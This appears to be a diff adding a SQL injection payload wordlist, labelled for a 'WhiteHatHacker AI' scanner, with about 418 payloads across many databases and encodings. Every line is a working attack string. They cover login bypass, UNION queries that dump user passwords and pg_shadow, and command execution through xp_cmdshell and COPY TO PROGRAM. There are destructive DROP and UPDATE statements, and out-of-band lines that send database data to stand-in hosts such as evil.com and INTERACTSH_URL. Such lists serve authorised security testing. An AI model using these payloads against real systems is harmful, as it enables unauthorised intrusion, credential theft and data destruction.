@@ -1,0 +1,426 @@
+# ============================================================================
+# WhiteHatHacker AI — SQLi Payload Wordlist (v3.0)
+# Categories: Classic, Boolean Blind, Time Blind, Error Based, UNION,
+#   Stacked, Second-Order, JSON/GraphQL, DB-Specific (MySQL/PG/MSSQL/Oracle),
+#   OOB Data Exfiltration, WAF Bypass
+# Total: 418 unique payloads
+# ============================================================================
+
+" AND "1"="2
+" AND 1=2--
+" AND SLEEP(5)--
+" OR ""="
+" OR "1"="1
+" OR "1"="1"#
+" OR "1"="1"--
+" OR 1=1#
+" OR 1=1--
+" UNION SELECT 1,2,3--
+" UNION SELECT NULL--
+") OR ("1"="1
+")) UNION SELECT 1,2,3--
+"))--
+%252527%2520OR%25201%25253D1--
+%2527%20OR%201%253D1--
+%27%20OR%201%3D1--
+%27%20UNION%20SELECT%201%2C2%2C3--
+' %55NION %53ELECT 1,2,3--
+' /*!12345UNION SELECT*/ 1,2,3--
+' /*!50000OR*/ 1=1--
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+' /*!OR*/ 1=1--
+' /*!UNION*/ /*!ALL*/ /*!SELECT*/ 1,2,3--
+' /*!UNION*/ /*!SELECT*/ 1,2,3--
+' ;--
+' AND '1'='2
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1)=1--
+' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>109--
+' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>96--
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT COUNT(*) FROM all_tables)>0 AND ''='
+' AND (SELECT COUNT(*) FROM all_tables)>0--
+' AND (SELECT COUNT(*) FROM all_users)>0--
+' AND (SELECT COUNT(*) FROM mysql.user)>0--
+' AND (SELECT COUNT(*) FROM sqlite_master)>0--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(database()))>0--
+' AND (SELECT LENGTH(username) FROM users LIMIT 1)>4--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\a')))--
+' AND (SELECT SLEEP(5))--
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+' AND (SELECT TOP 1 name FROM master..sysdatabases)>'a'--
+' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL--
+' AND (SELECT pg_sleep(5))--
+' AND (SELECT string_agg(datname,',') FROM pg_database) IS NOT NULL--
+' AND (SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') IS NOT NULL--
+' AND (SELECT user FROM dual) IS NOT NULL--
+' AND (SELECT username FROM users WHERE username='admin')='admin'--
+' AND 0--
+' AND 1::int=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
+' AND 1=(SELECT 1 LIMIT 1)--
+' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
+' AND 1=(SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE 1 END)--
+' AND 1=(SELECT COUNT(*) FROM generate_series(1,5000000))--
+' AND 1=(SELECT TOP 1 1 FROM information_schema.tables)--
+' AND 1=0--
+' AND 1=1 AND '1'='1
+' AND 1=1 UNION SELECT sql FROM sqlite_master--
+' AND 1=1; WAITFOR DELAY '0:0:5'--
+' AND 1=2#
+' AND 1=2--
+' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual--
+' AND 1=CAST((SELECT current_database()) AS INT)--
+' AND 1=CAST((SELECT version()) AS INT)--
+' AND 1=CAST((SELECT version()) AS int)--
+' AND 1=CONVERT(INT,(SELECT @@version))--
+' AND 1=CONVERT(INT,(SELECT DB_NAME()))--
+' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--
+' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
+' AND 1=UTL_INADDR.get_host_address('INTERACTSH_URL')--
+' AND 1=randomblob(500000000)--
+' AND @@SERVERNAME IS NOT NULL--
+' AND @@version LIKE '5%'--
+' AND ASCII(SUBSTR((SELECT version()),1,1))>52--
+' AND ASCII(SUBSTRING(database(),1,1))>96--
+' AND BENCHMARK(10000000,SHA1('test'))--
+' AND CASE WHEN 1=1 THEN RANDOMBLOB(200000000) ELSE 0 END--
+' AND CHAR(97)=CHAR(97)--
+' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))='1'--
+' AND DBMS_LDAP.INIT(((SELECT banner FROM v$version WHERE ROWNUM=1)||'.evil.com'),80) FROM dual--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--
+' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),10) FROM dual--
+' AND DB_NAME()>'a'--
+' AND EXP(710)--
+' AND EXP(~(SELECT * FROM (SELECT version())a))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND HAS_DBACCESS('master')=1--
+' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0,SLEEP(5),0)--
+' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--
+' AND IS_SRVROLEMEMBER('sysadmin')=1--
+' AND JSON_EXTRACT('{"a":1}','$.a')=1--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))--
+' AND LEN(SUSER_SNAME())>1--
+' AND LENGTH((SELECT version()))>1--
+' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+' AND LOAD_FILE(CONCAT('\\\\',version(),'.evil.com\\share'))--
+' AND MATCH(column) AGAINST('test')--
+' AND MID(version(),1,1)='5'--
+' AND ORD(MID(database(),1,1))>96--
+' AND ROWNUM=1 AND ''='
+' AND SLEEP(5)#
+' AND SLEEP(5)--
+' AND SUBSTRING(@@version,1,1)='M'--
+' AND SUBSTRING(database(),1,1)='a'--
+' AND TYPEOF(1)='integer'--
+' AND UNICODE(SUBSTR((SELECT sql FROM sqlite_master LIMIT 1),1,1))>64--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND UTL_HTTP.REQUEST('http://evil.com/?v='||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual--
+' AND XMLType((SELECT '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://INTERACTSH_URL/">%remote;]>' FROM dual)) IS NOT NULL--
+' AND current_database()='postgres'--
+' AND extractvalue(1,concat(0x7e,version(),0x7e))--
+' AND sqlite_version() IS NOT NULL--
+' AND updatexml(1,concat(0x7e,version(),0x7e),1)--
+' AND version() LIKE 'PostgreSQL%'--
+' AND%201=1--
+' AND(SELECT 1)=1--
+' AND/**/1=1--
+' AND\n1=1--
+' GROUP BY 1--
+' HAVING 1=1--
+' IF (1=1) WAITFOR DELAY '0:0:5'--
+' IF (1=2) WAITFOR DELAY '0:0:5'--
+' OR ''='
+' OR '1'='1
+' OR '1'='1'#
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 'a'='a
+' OR 0x31=0x31--
+' OR 1#
+' OR 1--
+' OR 1=1 LIMIT 1#
+' OR 1=1 LIMIT 1--
+' OR 1=1#
+' OR 1=1--
+' OR 1=1/*
+' OR JSON_EXTRACT('{"a":1}','$.a')=1--
+' OR SLEEP(5)--
+' OR/**/1=1--
+' ORDER BY 1 DESC--
+' ORDER BY 1,SLEEP(5)--
+' ORDER BY 1--
+' ORDER BY 10--
+' ORDER BY 100--
+' ORDER BY 2--
+' ORDER BY 3--
+' OR\n1=1--
+' PROCEDURE ANALYSE()--
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--
+' UN/**/ION SEL/**/ECT 1,2,3--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION SELECT 'admin','$2b$12$malicious_hash' --
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT 1,2,3,4,5,6,7,8,9--
+' UNION SELECT 1,2,3,4,5,6,7,8--
+' UNION SELECT 1,2,3,4,5,6,7--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2--
+' UNION SELECT 1--
+' UNION SELECT @@version,NULL--
+' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--
+' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'--
+' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users--
+' UNION SELECT NULL FROM dual--
+' UNION SELECT NULL,(SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow)--
+' UNION SELECT NULL,@@servername,NULL--
+' UNION SELECT NULL,DB_NAME(),NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--
+' UNION SELECT NULL,current_database(),NULL--
+' UNION SELECT NULL,sqlite_version(),NULL--
+' UNION SELECT NULL,string_agg(table_name,',') FROM information_schema.tables--
+' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM<10--
+' UNION SELECT NULL--
+' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT current_user(),NULL--
+' UNION SELECT database(),NULL--
+' UNION SELECT name FROM sqlite_master WHERE type='table'--
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+' UNION SELECT sql FROM sqlite_master--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT tbl_name FROM sqlite_master--
+' UNION SELECT user(),NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT version(),NULL--
+' UNION%09SELECT%091,2,3--
+' UNION%0aSELECT%0a1,2,3--
+' UNION%0bSELECT%0b1,2,3--
+' UNION%0cSELECT%0c1,2,3--
+' UNION%0dSELECT%0d1,2,3--
+' UNION%a0SELECT%a01,2,3--
+' UNION(SELECT(1),(2),(3))--
+' UNION+SELECT+1,2,3--
+' UnIoN SeLeCt 1,2,3--
+' aNd 1=1--
+' uNiOn sElEcT 1,2,3--
+'#
+'%26%261=1--
+'%7C%7C1=1--
+'&&1=1--
+') AND SLEEP(5)--
+') OR ('1'='1
+') UNION SELECT 1,2,3--
+') UNION SELECT NULL--
+')#
+')--
+'+(SELECT '')+
+'--
+'-- -
+'--+
+'-IF(1=1,SLEEP(5),0)-'
+'/*
+'; COPY (SELECT '') TO PROGRAM 'curl INTERACTSH_URL'--
+'; COPY (SELECT '') TO PROGRAM 'whoami'--
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'--
+'; DECLARE @q NVARCHAR(4000);SET @q='SELECT 1';EXEC(@q)--
+'; DECLARE @q VARCHAR(1024);SET @q='\\'+DB_NAME()+'.evil.com\share';EXEC master..xp_dirtree @q--
+'; DROP TABLE IF EXISTS whai_test; --
+'; DROP TABLE users--
+'; EXEC master..xp_cmdshell 'ping evil.com'--
+'; EXEC master..xp_dirtree '\\INTERACTSH_IP\share'--
+'; EXEC master..xp_dirtree '\\evil.com\share'--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell('whoami')--
+'; IF (SELECT COUNT(*) FROM master..sysdatabases)>0 WAITFOR DELAY '0:0:5'--
+'; INSERT INTO users VALUES('hacker','hacked')--
+'; SELECT * FROM users--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+'; SELECT SLEEP(5)--
+'; SELECT pg_sleep(5)--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; WAITFOR DELAY '0:0:5'--
+';#
+';--
+';SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
+'||(SELECT '')||'
+'||(SELECT 1)||'
+'||1=1--
+'||pg_sleep(5)--
+-(1)UNION(SELECT(1),2,3)--
+-1 OR 1=1
+-1 UNION SELECT 1,2,3
+-1' UNION SELECT CONCAT(0x7e,version(),0x7e),2,3--
+-1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+-1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+-1' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+-1' UNION SELECT INTO OUTFILE '/tmp/test.txt'--
+-1' UNION SELECT LOAD_FILE('/etc/passwd')--
+-1'/**/UNION/**/SELECT/**/1,2,3--
+/*!50000SELECT*/ /*!50000FROM*/ information_schema.tables
+0 UNION SELECT 1,2,3
+1 AND 1=1
+1 AND 1=2
+1 AND SLEEP(5)
+1 AND SLEEP(5)--
+1 GROUP BY 1
+1 HAVING 1=1
+1 OR 1=1
+1 OR 1=1#
+1 OR 1=1--
+1 ORDER BY 100
+1 PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1)
+1 UNION SELECT 1,2,3
+1 UNION SELECT NULL,NULL,NULL
+1" OR "1"="1
+1' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--
+1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+1' /*!UNION*/ /*!SELECT*/ 1,2,3--
+1' AND 'a'='a'--
+1' AND 'a'='b'--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END)--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.INTERACTSH_URL\\x')))--
+1' AND 1=(SELECT 1)--
+1' AND 1=(SELECT COUNT(*) FROM all_tables)--
+1' AND 1=1--
+1' AND 1=2--
+1' AND 1=CAST((SELECT version()) AS int)--
+1' AND 1=CONVERT(int,(SELECT @@version))--
+1' AND 1=UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL')--
+1' AND BENCHMARK(5000000,SHA1('test'))--
+1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND JSON_EXTRACT('{"a":1}','$.a')=1--
+1' AND JSON_TYPE(password)='string'--
+1' AND LOAD_FILE(CONCAT('\\\\',version(),'.INTERACTSH_URL\\x'))--
+1' AND SLEEP(5)--
+1' AND SUBSTRING(version(),1,1)='5'--
+1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
+1' AnD 1=1--
+1' OR '1'='1
+1' OR '1'='1'--
+1' OR '1'='1'/*
+1' OR 1=1#
+1' OR'1'='1
+1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+1' UNI%4FN SEL%45CT 1,2,3--
+1' UNION ALL SELECT 1,CHAR(117,115,101,114,110,97,109,101),3--
+1' UNION ALL SELECT NULL,@@version,NULL--
+1' UNION ALL SELECT NULL,NULL,NULL--
+1' UNION SELECT NULL,@@version,NULL--
+1' UNION SELECT NULL,banner,NULL FROM v$version--
+1' UNION%09SELECT%091,2,3--
+1' UNION%0ASELECT%0A1,2,3--
+1' UNION%0BSELECT%0B1,2,3--
+1' UNION%0CSELECT%0C1,2,3--
+1' UNION%0D%0ASELECT%0D%0A1,2,3--
+1' UNION%0DSELECT%0D1,2,3--
+1' UNION%23%0ASELECT 1,2,3--
+1'%09OR%091=1--
+1'%0aOR%0a1=1--
+1'%0bOR%0b1=1--
+1'%0cOR%0c1=1--
+1'%0dOR%0d1=1--
+1'%20OR%201=1--%20
+1'%55NION%53ELECT 1,2,3--
+1'+OR+1=1--+
+1'+UnIoN+SeLeCt+1,2,3--
+1'+un/**/ion+se/**/lect+1,2,3--
+1'--\nOR 1=1--
+1'/*!50000OR*/1=1--
+1'/*!OR*/1=1--
+1'/*!UNION*//*!SELECT*/1,2,3--
+1'/**/OR/**/1/**/=/**/1--
+1'/**/OR/**/1=1--
+1'; COPY (SELECT version()) TO '/tmp/test'--
+1'; DECLARE @q VARCHAR(200);SET @q='\\INTERACTSH_URL\x';EXEC master..xp_dirtree @q--
+1'; DECLARE @q VARCHAR(200);SET @q=CONCAT('\\',@@version,'.INTERACTSH_URL\x');EXEC master..xp_dirtree @q--
+1'; EXEC master..xp_dirtree '\\INTERACTSH_URL\x'--
+1'; EXEC xp_cmdshell('whoami')--
+1'; INSERT INTO logs VALUES('test');--
+1'; SELECT 1;--
+1'; SELECT PG_SLEEP(5)--
+1'; UPDATE users SET role='admin' WHERE user='test';--
+1'; WAITFOR DELAY '0:0:5'--
+1'OR'1'='1'--
+1'\nOR\n1=1\n--
+1'||(SELECT string_agg(table_name,',') FROM information_schema.tables)--
+1'||1=1--
+1) AND 1=1--
+1) AND 1=2--
+1) OR (1=1
+1)) AND 1=1--
+1)) AND 1=2--
+1)) OR ((1=1
+1;SELECT SLEEP(5)
+999999 UNION SELECT 1,2,3
+Accept-Language: ' OR 1=1--
+Cookie: id=1' OR 1=1--
+Cookie: session='; SELECT SLEEP(5)--
+OR 1=1
+OR 1=1#
+OR 1=1--
+Referer: ' OR 1=1--
+Referer: '; SELECT SLEEP(5)--
+SELECT/**/username/**/FROM/**/users
+User-Agent: ' OR 1=1--
+User-Agent: '; SELECT SLEEP(5)--
+X-Forwarded-For: ' OR 1=1--
+admin' AND 1=1--
+admin' AND 1=2--
+admin' OR '1'='1'--
+admin' OR 1=1--
+admin'#
+admin'+(SELECT 1)+'
+admin'--
+admin'-- (login as admin via stored username)
+admin'/*
+admin'||(SELECT 1 FROM dual)--
+test" AND "1"="1
+test" AND 1=1 AND "a"="a
+test")) AND 1=1 AND (("a"="a
+test' AND '1'='1
+test' AND 1=1 AND 'a'='a
+test') AND 1=1 AND ('a'='a
+test'); INSERT INTO users(username,password,role) VALUES('hacker','pass','admin');--
+test'-- (register with this username, used later in query)
+test'; DROP TABLE users;--
+test'; UPDATE users SET role='admin' WHERE username='test';-- (stored and re-executed)
+{"id": "1 UNION SELECT 1,2,3--"}
+{"id": "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"}
+{"id": "1' OR 1=1--"}
+{"query": "mutation { login(user: \"admin'--\", pass: \"x\") { token } }"}
+{"query": "{ user(id: \"1' OR 1=1--\") { name } }"}
+{"query": "{ users(filter: \"' UNION SELECT 1--\") { id } }"}
+{"search": "test' AND SLEEP(5)--"}
+{"user": {"$gt": ""}}
+{"user": {"$ne": null}}
